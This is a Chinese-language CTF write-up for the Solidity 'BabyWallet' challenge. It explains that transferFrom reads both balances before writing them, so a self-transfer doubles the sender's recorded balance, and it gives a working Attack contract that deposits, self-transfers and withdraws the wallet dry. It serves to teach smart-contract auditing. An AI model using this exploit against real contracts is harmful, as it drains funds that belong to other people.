# 源码

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;

contract BabyWallet {
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;//钱存进钱包
    }

    function withdraw(uint256 amt) public {
        require(balances[msg.sender] >= amt, "You can't withdraw that much");
        balances[msg.sender] -= amt;
        (bool success,) = msg.sender.call{value: amt}("");//钱包转给msg.sender
        require(success, "Failed to withdraw that amount");
    }

    function approve(address recipient, uint256 amt) public {
        allowances[msg.sender][recipient] += amt;
    }

    function transfer(address recipient, uint256 amt) public {
        require(balances[msg.sender] >= amt, "You can't transfer that much");
        balances[msg.sender] -= amt;
        balances[recipient] += amt;
    }

    function transferFrom(address from, address to, uint256 amt) public {
        uint256 allowedAmt = allowances[from][msg.sender];
        uint256 fromBalance = balances[from];
        uint256 toBalance = balances[to];

        require(fromBalance >= amt, "You can't transfer that much");
        require(allowedAmt >= amt, "You don't have approval for that amount");

        balances[from] = fromBalance - amt;
        balances[to] = toBalance + amt;
        allowances[from][msg.sender] = allowedAmt - amt;
    }

    fallback() external payable {}
    receive() external payable {}
}

// Setup

contract Setup {
    BabyWallet public wallet;

    constructor() payable {
        require(msg.value == 100 ether, "requires 100 ether");
        wallet = new BabyWallet();
        payable(address(wallet)).transfer(msg.value);
    }

    function isSolved() public view returns (bool) {
        return address(wallet).balance == 0 ether;
    }
}

```

# 思路

setup时构造函数给了wallet合约100ether,要求把wallet掏空,注意这里要求的是.balance,真的余额要为0:

```solidity
 function isSolved() public view returns (bool) {
        return address(wallet).balance == 0 ether;
    }
```

但是这里的balances只是一个mapping,包括函数里用的也都是这个mapping

```solidity
contract BabyWallet {
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowances;
```

我们可以首先`deposit()`存100ether,注意,钱是存到这个wallet合约里了,我们这里只是mapping加100,余额这个数字加100

突破点是这里:

```solidity
function transferFrom(address from, address to, uint256 amt) public {
        uint256 allowedAmt = allowances[from][msg.sender];
        uint256 fromBalance = balances[from]; // 100
        uint256 toBalance = balances[to]; // 100

        require(fromBalance >= amt, "You can't transfer that much");
        require(allowedAmt >= amt, "You don't have approval for that amount");

        balances[from] = fromBalance - amt; // 100 - 100 = 0
        balances[to] = toBalance + amt; // 100 + 100 = 200
        allowances[from][msg.sender] = allowedAmt - amt;
    }
```

关键点就是**from和to是同一个地址**,因为他是mapping在变,而且balances\[to]后更新,这就会导致余额mapping变成200 一定要动手自己算算 别两眼一看就过去了

这下就有200了,可以`withdraw()`从钱包提钱了

// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {BabyWallet} from "./BabyWallet.sol";

contract Attack {
    BabyWallet public babywallet;

    constructor(address payable addr) {
        babywallet = BabyWallet(addr);
    }

    function attack() external payable {
        babywallet.deposit{value: 100 ether}();
        babywallet.approve(address(this), type(uint256).max);
        babywallet.transferFrom(address(this), address(this), 100 ether);
        babywallet.withdraw(200 ether);
        require(address(babywallet).balance == 0, "no");
    }

    fallback() external payable {}

    receive() external payable {}
}
